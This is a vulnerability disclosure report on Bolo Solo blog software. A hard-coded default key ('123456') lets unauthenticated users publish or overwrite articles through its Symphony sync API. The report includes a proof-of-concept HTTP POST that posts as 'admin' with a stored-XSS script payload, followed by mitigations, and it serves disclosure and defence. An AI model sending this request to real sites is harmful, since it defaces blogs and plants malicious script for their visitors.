# Vulnerability Report: Bolo Solo Default B3 Key Allows Unauthenticated Article Publishing

- **Submitter:** sh7err@vEcho
- **Product:** Bolo Solo (https://github.com/bolo-blog/bolo-solo)
- **Affected Versions:** <= 4.3.4 (latest master)
- **Vulnerability Type:** Authentication Bypass due to default credentials
- **CWE:** CWE-798 (Use of Hard-coded Credentials)

## Summary
Bolo Solo offers a `/apis/symphony/article` endpoint for synchronizing content with the HacPai/Symphony community. The endpoint relies entirely on a shared "B3 Key" supplied in the request body. If administrators do not manually configure `Option.ID_C_B3LOG_KEY`, the code automatically falls back to the hard-coded default value `123456`. Because newly deployed instances ship with this default and the endpoint lacks any other authentication, anyone on the Internet can publish or overwrite blog posts by sending the default key.

## Technical Details
- `UserQueryService.getB3password()` (`src/main/java/org/b3log/solo/service/UserQueryService.java:266-276`) returns `Option.DefaultPreference.DEFAULT_B3LOG_PASSWORD` (`src/main/java/org/b3log/solo/model/Option.java:637-645`) when the option is absent, which is the constant `"123456"`.
- `B3Receiver.postArticle()` (`src/main/java/org/b3log/solo/processor/B3Receiver.java:137-209`) verifies only that `client.userB3Key` equals the value from `getB3password()`. There is no authentication, rate limiting, or per-user secret.
- Default deployments do not populate `b3logKey`, therefore every installation accepts the same shared secret.

## Impact
Any unauthenticated remote attacker can create, modify, or delete blog articles by impersonating any local author. This enables:
- Publishing defacement or phishing content under the administrator’s name.
- Injecting malicious JavaScript into blog posts (stored XSS).
- Disrupting site integrity by deleting or overwriting legitimate articles.

## Proof of Concept
1. Deploy Bolo Solo with default settings (do not set a custom B3 key in preferences). The blog functions normally, but `b3logKey` remains unset and the system uses `123456` internally.
2. Send the following HTTP request:
   ```http
   POST /apis/symphony/article HTTP/1.1
   Host: victim.example
   Content-Type: application/json

   {
     "client": {
       "userName": "admin",
       "userB3Key": "123456"
     },
     "article": {
       "id": "attacker-post-1",
       "title": "Injected content",
       "content": "<script>alert('defaced');</script>",
       "contentHTML": "<p>Injected</p>",
       "tags": "malicious"
     }
   }
   ```
3. The server accepts the request, creating or overwriting the article with attacker-controlled HTML/JS under the `admin` account.

## Mitigation
- Generate a random, instance-specific B3 key during installation and require administrators to change it before enabling `/apis/symphony/article`.
- Bind B3 keys to individual user accounts instead of a single global secret.
- Reject requests when the key equals the known default or when the option is unset.

## References
- Source: `src/main/java/org/b3log/solo/processor/B3Receiver.java`
- Source: `src/main/java/org/b3log/solo/service/UserQueryService.java`
- Source: `src/main/java/org/b3log/solo/model/Option.java`

